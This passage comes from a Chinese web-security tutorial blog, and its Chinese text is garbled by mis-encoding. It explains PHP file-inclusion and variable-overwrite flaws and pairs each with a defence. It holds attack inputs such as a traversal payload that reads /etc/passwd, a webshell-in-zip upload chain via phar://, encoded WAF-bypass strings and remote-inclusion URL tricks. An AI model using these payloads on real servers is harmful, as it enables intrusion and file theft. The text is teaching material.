</blockquote>
<p>phar://ï¼šPHP å½’æ¡£ï¼Œå¸¸å¸¸è·Ÿæ–‡ä»¶åŒ…å«ï¼Œæ–‡ä»¶ä¸Šä¼ ç»“åˆç€è€ƒå¯Ÿã€‚å½“æ–‡ä»¶ä¸Šä¼ ä»…ä»…æ ¡éªŒmimeç±»å‹ä¸æ–‡ä»¶åç¼€ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼è¿›è¡Œåˆ©ç”¨ã€‚</p>
<p><strong>åˆ©ç”¨æ–¹å¼ï¼šå†™å…¥ä¸€å¥è¯shell.php -&gt; å‹ç¼©ä¸ºshell.zip -&gt; ä¿®æ”¹åç¼€ä¸ºshell.jpg -&gt;ä¸Šä¼ åˆ°ç½‘ç«™ -&gt; phar://shell.jpg/shell.php</strong></p>
<p>å‡è®¾æœ‰ä¸ªæ–‡ä»¶phpinfo.txtï¼Œå…¶å†…å®¹ä¸º<code>&lt;?php phpinfo(); ?&gt;</code>ï¼Œæ‰“åŒ…æˆzipå‹ç¼©åŒ…ï¼Œå¦‚ä¸‹ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191115173036.png" alt=""></p>
<p>æŒ‡å®šç»å¯¹è·¯å¾„ï¼š</p>
<p><code>index.php?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/phpinfo.txt</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191115173136.png" alt=""></p>
<h4 id="zip-åè®®">zip://åè®®</h4>
<blockquote>
<p>phpç‰ˆæœ¬ â‰¥ 5.3</p>
</blockquote>
<p>åˆ©ç”¨å’Œæ„é€ zipåŒ…çš„æ–¹æ³•åŒphar://åè®®ï¼Œä½†ä½¿ç”¨zipåè®®ï¼Œéœ€è¦æŒ‡å®šç»å¯¹è·¯å¾„ï¼ŒåŒæ—¶å°†<code>#</code>ç¼–ç ä¸º<code>%23</code>ï¼Œä¹‹åå¡«ä¸Šå‹ç¼©åŒ…å†…çš„æ–‡ä»¶ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php?file&#x3D;zip:&#x2F;&#x2F;D:\phpStudy\WWW\fileinclude\test.zip%23phpinfo.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="åŒ…å«Sessionæ–‡ä»¶">åŒ…å«Sessionæ–‡ä»¶</h3>
<p>å‰ææ¡ä»¶ï¼šSessionæ–‡ä»¶è·¯å¾„å·²çŸ¥ï¼Œä¸”å…¶ä¸­å†…å®¹çš„éƒ¨åˆ†å¯æ§ã€‚</p>
<p>é¦–å…ˆç¬¬ä¸€ä¸ªæ¡ä»¶ï¼šSessionçš„æ–‡ä»¶è·¯å¾„å¯ä»¥åœ¨php.iniä¸­çš„<code>session.save_handler</code>å­—æ®µæŸ¥çœ‹åˆ°ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191115195053.png" alt=""></p>
<blockquote>
<p>ä¸€èˆ¬è€Œè¨€ï¼Œsessionæ–‡ä»¶çš„å­˜æ”¾ä½ç½®ä¸ºï¼š</p>
<ul>
<li>/var/lib/php/sess_PHPSESSID</li>
<li>/tmp/sess_PHPSESSID</li>
<li>/tmp/sessions/sess_PHPSESSID</li>
</ul>
</blockquote>
<p>ç¬¬äºŒä¸ªæ¡ä»¶ï¼šå†…å®¹å¯æ§ï¼Œè¿™ä¸ªè¦æ±‚è¾ƒä¸ºè‹›åˆ»ï¼Œæœ‰äº›æ—¶å€™ï¼Œå¯ä»¥å…ˆåŒ…å«è¿›sessionæ–‡ä»¶ï¼Œè§‚å¯Ÿé‡Œé¢çš„å†…å®¹ï¼Œç„¶åæ ¹æ®é‡Œé¢çš„å­—æ®µæ¥å‘ç°å¯æ§çš„å˜é‡ï¼Œä»è€Œåˆ©ç”¨å˜é‡æ¥å†™å…¥payloadï¼Œå¹¶ä¹‹åå†æ¬¡åŒ…å«ä»è€Œæ‰§è¡Œphpä»£ç ã€‚</p>
<h3 id="åŒ…å«æ—¥å¿—æ–‡ä»¶">åŒ…å«æ—¥å¿—æ–‡ä»¶</h3>
<p>å‰ææ¡ä»¶ï¼šè¦çŸ¥é“æœåŠ¡å™¨æ—¥å¿—çš„å­˜å‚¨è·¯å¾„ï¼Œä¸”æ—¥å¿—æ–‡ä»¶å¯è¯»ã€‚</p>
<p>æœåŠ¡å™¨ä¸€èˆ¬å›åœ¨Web Serverçš„access_logé‡Œè®°å½•å®¢æˆ·ç«¯çš„è¯·æ±‚ä¿¡æ¯ï¼Œåœ¨error_logé‡Œè®°å½•å‡ºé”™ä¿¡æ¯ã€‚æ‰€ä»¥æ”»å‡»è€…å¯ä»¥é—´æ¥åœ°å°†PHPä»£ç å†™å…¥æ—¥å¿—æ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶åŒ…å«æ—¶ï¼Œåªéœ€è¦åŒ…å«æ—¥å¿—æ–‡ä»¶å³å¯ã€‚</p>
<p>ä½†å¦‚æœæ˜¯ç›´æ¥å‘èµ·è¯·æ±‚ï¼Œä¼šå¯¼è‡´ä¸€äº›ç¬¦å·è¢«ç¼–ç ä½¿å¾—åŒ…å«æ— æ³•æ­£ç¡®è§£æã€‚å¯ä»¥ä½¿ç”¨burpæˆªåŒ…åä¿®æ”¹ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191115195755.png" alt=""></p>
<p>æ­£å¸¸çš„PHPä»£ç å·²ç»å†™å…¥äº† /var/log/apache2/access.logã€‚ç„¶åè¿›è¡ŒåŒ…å«å³å¯ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191115195833.png" alt=""></p>
<h3 id="åŒ…å«environæ–‡ä»¶">åŒ…å«environæ–‡ä»¶</h3>
<p>/proc/self/environæ–‡ä»¶é‡Œé¢æœ‰Webè¿›ç¨‹è¿è¡Œæ—¶çš„ç¯å¢ƒå˜é‡ï¼Œå…¶ä¸­å¾ˆå¤šéƒ½æ˜¯ç”¨æˆ·å¯ä»¥æ§åˆ¶çš„ï¼Œæœ€å¸¸è§çš„åšæ³•å°±æ˜¯åœ¨User-Agentä¸­æ³¨å…¥PHPä»£ç ã€‚</p>
<p>è¿™é‡Œæœ‰å¾ˆå®Œæ•´çš„åˆ©ç”¨è¿‡ç¨‹è¯´æ˜ï¼š <a href="https://www.exploit-db.com/papers/12886">https://www.exploit-db.com/papers/12886</a></p>
<h3 id="åŒ…å«ä¸´æ—¶æ–‡ä»¶">åŒ…å«ä¸´æ—¶æ–‡ä»¶</h3>
<p>ä»¥ä¸Šè¿™äº›æ–¹æ³•éƒ½è¦æ±‚PHPèƒ½è¿‡åŒ…å«è¿™äº›ä¸å¤„äºWebç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œå¦‚æœPHPè®¾ç½®äº†open_basedirï¼Œåˆ™å¾ˆå¯èƒ½ä¼šä½¿å¾—æ”»å‡»å¤±æ•ˆã€‚</p>
<p>phpä¸­ä¸Šä¼ æ–‡ä»¶ï¼Œä¼šåˆ›å»ºä¸´æ—¶æ–‡ä»¶ã€‚åœ¨linuxä¸‹ä½¿ç”¨/tmpç›®å½•ï¼Œè€Œåœ¨windowsä¸‹ä½¿ç”¨c:\winsdows\tempç›®å½•ã€‚åœ¨ä¸´æ—¶æ–‡ä»¶è¢«åˆ é™¤ä¹‹å‰ï¼Œåˆ©ç”¨ç«äº‰å³å¯åŒ…å«è¯¥ä¸´æ—¶æ–‡ä»¶ã€‚</p>
<p>ç”±äºåŒ…å«éœ€è¦çŸ¥é“åŒ…å«çš„æ–‡ä»¶åã€‚ä¸€ç§æ–¹æ³•æ˜¯è¿›è¡Œæš´åŠ›çŒœè§£ï¼Œlinuxä¸‹ä½¿ç”¨çš„éšæœºå‡½æ•°æœ‰ç¼ºé™·ï¼Œè€Œwindowä¸‹åªæœ‰65535ä¸­ä¸åŒçš„æ–‡ä»¶åï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•æ˜¯å¯è¡Œçš„ã€‚</p>
<p>å¦ä¸€ç§æ–¹æ³•æ˜¯é…åˆphpinfoé¡µé¢çš„php variablesï¼Œå¯ä»¥ç›´æ¥è·å–åˆ°ä¸Šä¼ æ–‡ä»¶çš„å­˜å‚¨è·¯å¾„å’Œä¸´æ—¶æ–‡ä»¶åï¼Œç›´æ¥åŒ…å«å³å¯ã€‚è¿™ä¸ªæ–¹æ³•å¯ä»¥å‚è€ƒ[LFI With PHPInfo Assistance](<a href="https://www.insomniasec.com/downloads/publications/LFI">https://www.insomniasec.com/downloads/publications/LFI</a> With PHPInfo Assistance.pdf)</p>
<h3 id="åŒ…å«ä¸Šä¼ æ–‡ä»¶">åŒ…å«ä¸Šä¼ æ–‡ä»¶</h3>
<p>å°±ç»™ä¸€é“CTFçš„é¢˜å§ï¼Œæœ€è¿‘åœ¨ç©è¿™ä¸ªï¼Œè†œæ‹œä¸€ä¸‹å¤§ä½¬å†™çš„è„šæœ¬ã€‚</p>
<p><a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-babyweb-writeup/">XMANå¤ä»¤è¥-2017-babyweb-writeup</a></p>
<h2 id="ç»•è¿‡æ–¹å¼">ç»•è¿‡æ–¹å¼</h2>
<p>æ¯”å¦‚ä¸‹é¢è¿™æ®µä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (file_exists(<span class="string">&#x27;/home/wwwrun/&#x27;</span>.$file.<span class="string">&#x27;.php&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;/home/wwwrun/&#x27;</span>.$file.<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è¿™æ®µä»£ç æŠŠinlcudeè·¯å¾„çš„å‰ç¼€éƒ¨åˆ†ã€åç¼€éƒ¨åˆ†éƒ½ç»™æ§åˆ¶ä½äº†ã€‚ç›¸æ¯”äºè¿è·¯å¾„çš„å‰ç¼€éƒ½ç”±ç”¨æˆ·æ§åˆ¶çš„é‚£ç§æ¼æ´å·²ç»å®‰å…¨å¤šäº†ã€‚ä½†æ˜¯è¿™é‡Œå­˜åœ¨å‡ ä¸ªé—®é¢˜ã€‚</p>
<h3 id="00å­—ç¬¦æˆªæ–­">00å­—ç¬¦æˆªæ–­</h3>
<blockquote>
<p>è¿™ç§æ–¹å¼éœ€è¦ PHPç‰ˆæœ¬&lt;=5.2</p>
</blockquote>
<p>ç”¨æˆ·èƒ½å¤Ÿæ§åˆ¶fileå‚æ•°ï¼Œå½“fileçš„å€¼ä¸º<code>../../etc/passwd\0</code>æ—¶ï¼Œç›¸å½“äºæ‰§è¡Œäº†<code>include '/home/wwwrun/../../etc/passwd'</code>è¿™æ¡è¯­å¥ã€‚</p>
<blockquote>
<p>å¦‚æœä¸é€‚ç”¨<code>\0</code>æˆªæ–­çš„è¯ï¼Œè¢«åŒ…å«çš„æ–‡ä»¶å®é™…ä¸Šæ˜¯<code>/etc/passwd.php</code>ï¼Œä½†è¿™ä¸ªæ–‡ä»¶è‡ªç„¶æ˜¯ä¸å­˜åœ¨çš„ã€‚æ‰€ä»¥åœ¨è¿™ä¸ªåœ°æ–¹ï¼Œæ”»å‡»è€…åªè¦åœ¨æœ€ååŠ å…¥ä¸€ä¸ª0å­—èŠ‚ï¼ˆ\x00ï¼‰ï¼Œå°±èƒ½æˆªæ–­fileå˜é‡ä¹‹åçš„å­—ç¬¦ä¸²ã€‚</p>
</blockquote>
<p>å¦‚æœæ˜¯é€šè¿‡Webè¾“å…¥ï¼Œåªéœ€è¦UrlEencodeå˜ä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">..&#x2F;..&#x2F;etc&#x2F;passwd%00</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>é˜²å¾¡æ–¹å¼ï¼šè¿‡æ»¤\00æˆªæ–­å­—ç¬¦ï¼Œè¿‡æ»¤ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getVal</span>(<span class="params">$name</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $value = <span class="keyword">isset</span>($_GET[$name]) ? $_GET[$name] : <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (is_string($value))</span><br><span class="line">    &#123;</span><br><span class="line">        $value = str_replace(<span class="string">&quot;\0&quot;</span>, <span class="string">&#x27;&#x27;</span>, $value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="è¶…é•¿å­—ç¬¦æˆªæ–­">è¶…é•¿å­—ç¬¦æˆªæ–­</h3>
<p>ç›®å½•å­—ç¬¦ä¸²åœ¨Windowsä¸‹256å­—èŠ‚ã€Linuxä¸‹4096å­—èŠ‚æ—¶ï¼Œä¼šè¾¾åˆ°æœ€å¤§å€¼ï¼Œæœ€å¤§å€¼ä¹‹åçš„å­—ç¬¦è¢«ä¸¢å¼ƒã€‚<strong>å¯ä»¥é€šè¿‡<code>./</code>çš„æ–¹å¼æ„é€ ç›®å½•</strong>ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;abc</span><br><span class="line">&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;abc</span><br><span class="line">..&#x2F;1&#x2F;abc..&#x2F;1&#x2F;abc..&#x2F;1&#x2F;abc</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="ç›®å½•éå†">ç›®å½•éå†</h3>
<p>é™¤äº†è¿™ç§æ”»å‡»æ–¹å¼ï¼Œè¿˜å¯ä»¥ä½¿ç”¨&quot;â€¦/â€¦/â€¦/â€œè¿™æ ·çš„æ–¹å¼æ¥è¿”å›åˆ°ä¸Šå±‚ç›®å½•ä¸­ï¼Œè¿™ç§æ–¹å¼åˆè¢«ç§°ä¸º&quot;ç›®å½•éå†(Path Traversal)â€ã€‚å¸¸è§çš„ç›®å½•éå†æ¼æ´ï¼Œè¿˜å¯ä»¥é€šè¿‡ä¸åŒçš„ç¼–ç æ–¹å¼æ¥ç»•è¿‡ä¸€äº›æœåŠ¡å™¨ç«¯çš„é˜²å¾¡é€»è¾‘(WAF) ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%2e%2e%2f    -&gt;    ..&#x2F;</span><br><span class="line">%2e%2e&#x2F;     -&gt;    ..&#x2F;</span><br><span class="line">..%2f     -&gt;    ..&#x2F;</span><br><span class="line">%2e%2e%5c    -&gt;    ..\</span><br><span class="line">%2e%2e%\    -&gt;    ..\</span><br><span class="line">..%5c     -&gt;    ..\</span><br><span class="line">%252e%252e%255c    -&gt;    ..\</span><br><span class="line">..%255c     -&gt;    ..\</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>é˜²å¾¡æ–¹å¼</p>
<p>ç›®å½•éå†æ¼æ´æ˜¯ä¸€ç§è·¨è¶Šç›®å½•è¯»å–æ–‡ä»¶çš„æ–¹æ³•ï¼Œä½†å½“PHPé…ç½®äº†open_basediræ—¶ï¼Œå°†å¾ˆå¥½åœ°ä¿æŠ¤æœåŠ¡å™¨ï¼Œä½¿å¾—è¿™ç§æ”»å‡»æ— æ•ˆã€‚<br>
open_basedirçš„ä½œç”¨æ˜¯é™åˆ¶åœ¨æŸä¸ªç‰¹å®šç›®å½•ä¸‹PHPèƒ½æ‰“å¼€çš„æ–‡ä»¶ã€‚</p>
<blockquote>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œopen_basedirçš„å€¼æ˜¯ç›®å½•çš„å‰ç¼€ï¼Œå¦‚æœè®¾ç½®å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">open_basedir &#x3D; &#x2F;home&#x2F;aaa</span><br></pre></td></tr></table></figure>
<p>é‚£ä¹ˆä»¥ä¸‹çš„ç›®å½•éƒ½æ˜¯è¢«å…è®¸çš„ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;home&#x2F;aaa</span><br><span class="line">&#x2F;home&#x2F;aaa&#x2F;bbb</span><br><span class="line">&#x2F;home&#x2F;aaa&#x2F;ccc</span><br></pre></td></tr></table></figure>
<p>å¦‚æœè¦é™å®šä¸€ä¸ªæŒ‡å®šçš„ç›®å½•ï¼Œåˆ™éœ€è¦åœ¨åé¢åŠ ä¸Šä¸€ä¸ª<code>/</code>ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;open_basedir &#x3D; &#x2F;home&#x2F;aaa&#x2F;</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="URLç»•è¿‡">URLç»•è¿‡</h3>
<h4 id="queryï¼ˆ-ï¼‰">queryï¼ˆ?ï¼‰</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php?file&#x3D;http:&#x2F;&#x2F;remoteaddr&#x2F;remoteinfo.txt? </span><br></pre></td></tr></table></figure>
<p>åˆ™åŒ…å«çš„æ–‡ä»¶ä¸º <code>http://remoteaddr/remoteinfo.txt?/test/test.php </code>ã€‚</p>
<p>é—®å·åé¢çš„éƒ¨åˆ†<code>/test/test.php</code>ï¼Œä¹Ÿå°±æ˜¯æŒ‡å®šçš„åç¼€è¢«å½“ä½œqueryä»è€Œè¢«ç»•è¿‡ã€‚</p>
<h4 id="fragment">fragment(#)</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php?file&#x3D;http:&#x2F;&#x2F;remoteaddr&#x2F;remoteinfo.txt%23</span><br></pre></td></tr></table></figure>
<p>åˆ™åŒ…å«çš„æ–‡ä»¶ä¸º<code>http://remoteaddr/remoteinfo.txt#/test/test.php </code>ã€‚</p>
<p>é—®å·åé¢çš„éƒ¨åˆ†<code>/test/test.php</code>ï¼Œä¹Ÿå°±æ˜¯æŒ‡å®šçš„åç¼€è¢«å½“ä½œfragmentä»è€Œè¢«ç»•è¿‡ã€‚æ³¨æ„éœ€è¦æŠŠ<code>#</code>è¿›è¡Œurlç¼–ç ä¸º<code>%23</code>ã€‚</p>
<h2 id="é˜²å¾¡æ–¹å¼">é˜²å¾¡æ–¹å¼</h2>
<p>ç»¼ä¸Šï¼Œè¦é˜²å¾¡LFIçš„æ¼æ´ï¼Œåº”è¯¥å°½é‡é¿å…åŒ…å«åŠ¨æ€çš„å˜é‡ï¼Œå°¤å…¶æ˜¯ç”¨æˆ·å¯ä»¥æ§åˆ¶çš„å˜é‡ã€‚ä¸€ç§å˜é€šçš„æ–¹å¼ï¼Œåˆ™æ˜¯ä½¿ç”¨æšä¸¾ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//whitelisting possible values</span></span><br><span class="line">    <span class="keyword">switch</span>($file)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;main&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;foo&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;bar&quot;</span>:</span><br><span class="line">            <span class="keyword">include</span> <span class="string">&quot;/home/wwwrun/include&quot;</span> . $file . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">include</span> <span class="string">&quot;/home/wwwrun/include/main.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="Reference">Reference</h2>
<ul>
<li>ã€Šç™½å¸½å­è®²Webå®‰å…¨ã€‹</li>
<li><a href="http://webcache.googleusercontent.com/search?q=cache:ByNQx_FhAlEJ:chybeta.github.io/2017/10/08/php%25E6%2596%2587%25E4%25BB%25B6%25E5%258C%2585%25E5%2590%25AB%25E6%25BC%258F%25E6%25B4%259E/+&amp;cd=8&amp;hl=en&amp;ct=clnk&amp;gl=de">PHPæ–‡ä»¶åŒ…å«</a></li>
<li>[<a href="https://www.cnblogs.com/LittleHann/p/3665062.html">LFIã€RFIã€PHPå°è£…åè®®å®‰å…¨é—®é¢˜å­¦ä¹ </a></li>
<li><a href="https://smelond.com/2018/09/04/LFI%E4%BB%A5%E5%8F%8ARF(%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB)%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8%E5%B0%8F%E6%8A%80%E5%B7%A7/">LFIä»¥åŠRFI(æ–‡ä»¶åŒ…å«)ä¼ªåè®®åˆ©ç”¨å°æŠ€å·§</a></li>
<li><a href="https://github.com/SewellDinG/LFIboomCTF">LFIBoomCTF</a></li>
</ul>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
        <category>åŸºç¡€å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>webå®‰å…¨åŸºç¡€</tag>
        <tag>æ–‡ä»¶åŒ…å«</tag>
      </tags>
  </entry>
  <entry>
    <title>Webå®‰å…¨å­¦ä¹ ä¹‹å˜é‡è¦†ç›–æ¼æ´åˆ©ç”¨</title>
    <url>/Web_security/basic_learning/14.%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="Webå®‰å…¨å­¦ä¹ ä¹‹å˜é‡è¦†ç›–æ¼æ´åˆ©ç”¨">Webå®‰å…¨å­¦ä¹ ä¹‹å˜é‡è¦†ç›–æ¼æ´åˆ©ç”¨</h1>
<p>è¿™ä¸€ç¯‡ä¸»è¦é€šè¿‡å‡ é“CTFé¢˜è®²è§£ä¸€ä¸‹PHPå˜é‡è¦†ç›–æ¼æ´åˆ©ç”¨ï¼Œä¸»è¦æ¶‰åŠåˆ°extract()å‡½æ•°ï¼Œparse_str()å‡½æ•°ï¼Œimport_request_variables()å‡½æ•°ï¼Œ$$è¿ç®—ç¬¦ã€‚</p>
<h2 id="å…¨å±€å˜é‡è¦†ç›–">å…¨å±€å˜é‡è¦†ç›–</h2>
<blockquote>
<p>PHP 5.3.0è¢«åºŸå¼ƒï¼ŒPHP5.4.0è¢«ç§»é™¤</p>
</blockquote>
<p>PHPä¸­ä½¿ç”¨å˜é‡å¹¶ä¸éœ€è¦åˆå§‹åŒ–ï¼Œå› æ­¤register_globals=Onæ—¶ï¼Œå˜é‡æ¥æºå¯èƒ½æ˜¯å„ä¸ªä¸åŒçš„åœ°æ–¹ï¼Œæ¯”å¦‚é¡µé¢çš„è¡¨å•ã€Cookieç­‰ã€‚ä¾‹å¦‚ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Register_gl`obals: &quot;</span> . (<span class="keyword">int</span>)ini_get(<span class="string">&quot;register_globals&quot;</span>) . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> ($auth) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;private&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å½“register_globals=Offæ—¶ï¼Œè¿™æ®µä»£ç ä¸ä¼šæœ‰é—®é¢˜ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191118084207.png" alt=""></p>
<p>ä½†æ˜¯å½“register_globals=Onæ—¶ï¼Œæäº¤<code>http://localhost/variableCover/index.php/?auth=1</code>ï¼Œå˜é‡<code>$auth</code>ä¼šè‡ªåŠ¨å¾—åˆ°èµ‹å€¼ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191118084337.png" alt=""></p>
<p>å¦‚æœåœ¨ä»£ç ä¸­å·²ç»åˆå§‹åŒ–äº†$authå˜é‡ï¼Œä¹Ÿä¸ä¼šæœ‰å˜é‡è¦†ç›–æ¼æ´ã€‚</p>
<p>å¦å¤–é€šè¿‡$GLOBALSè·å–çš„å˜é‡ï¼Œä¹Ÿå¯èƒ½å¯¼è‡´å˜é‡è¦†ç›–ã€‚</p>
<h2 id="extract-å˜é‡è¦†ç›–">extract()å˜é‡è¦†ç›–</h2>
<p>extract()å‡½æ•°ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰ç¬¦å·è¡¨ã€‚è¯¥å‡½æ•°ä½¿ç”¨æ•°ç»„é”®åä½œä¸ºå˜é‡åï¼Œæ•°ç»„é”®å€¼ä½œä¸ºå˜é‡å€¼ã€‚é’ˆå¯¹æ•°ç»„ä¸­æ¯ä¸€ä¸ªå…ƒç´ ï¼Œå°†åœ¨å½“å‰ç¬¦å·è¡¨ä¸­åˆ›å»ºå¯¹åº”çš„ä¸€ä¸ªå˜é‡ã€‚</p>
<p>å‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int extract ( array $var_array [, int $extract_type [, string $prefix ]] )</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­ï¼Œç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šå‡½æ•°å°†å˜é‡å¯¼å…¥ç¬¦å·è¡¨æ—¶çš„è¡Œä¸ºï¼Œæœ€å¸¸è§çš„ä¸¤ä¸ªå€¼æ˜¯EXTR_OVERWRITEå’ŒEXTR_SKIPã€‚</p>
<p>å½“å€¼ä¸ºEXTR_OVERWRITEæ—¶ï¼Œåœ¨å°†å˜é‡å¯¼å…¥ç¬¦å·è¡¨çš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æœå˜é‡åå‘ç”Ÿå†²çªï¼Œåˆ™è¦†ç›–æ‰€æœ‰å˜é‡ï¼›å€¼ä¸ºEXTR_SKIPåˆ™è¡¨ç¤ºè·³è¿‡ä¸è¦†ç›–ã€‚è‹¥ç¬¬äºŒä¸ªå‚æ•°æœªæŒ‡å®šï¼Œåˆ™åœ¨é»˜è®¤æƒ…å†µä¸‹ä½¿ç”¨EXTR_OVERWRITEã€‚</p>
<p>å½“extract()å‡½æ•°ä»ç”¨æˆ·å¯ä»¥æ§åˆ¶çš„æ•°ç»„ä¸­å¯¼å‡ºå˜é‡ä¸”ç¬¬äºŒä¸ªå‚æ•°æœªè®¾ç½®æˆ–è®¾ç½®ä¸ºEXTR_OVERWRITEæ—¶ï¼Œå°±å­˜åœ¨å˜é‡è¦†ç›–æ¼æ´ï¼Œä¾‹å¦‚ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$auth = <span class="number">1</span>;</span><br><span class="line">extract($_GET);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($auth == <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;private&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;public&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>åœ¨è¿™ä¸ªä¾‹å­é‡Œï¼Œextract()ä»$_GETä¸­å¯¼å‡ºå˜é‡ï¼Œä»è€Œå¯ä»¥å¯¼è‡´ä»»æ„å˜é‡è¢«è¦†ç›–ï¼Œå³ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191118144039.png" alt=""></p>
<h2 id="parse-str-å˜é‡è¦†ç›–">parse_str()å˜é‡è¦†ç›–</h2>
<p>å‡½æ•°å®šä¹‰ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> parse_str (<span class="keyword">string</span> $str [, <span class="keyword">array</span> $arr])</span><br></pre></td></tr></table></figure>
<p>å½“parse_str()å‡½æ•°çš„å‚æ•°å€¼å¯ä»¥è¢«ç”¨æˆ·æ§åˆ¶æ—¶ï¼Œåˆ™å­˜åœ¨å˜é‡è¦†ç›–æ¼æ´ï¼š</p>
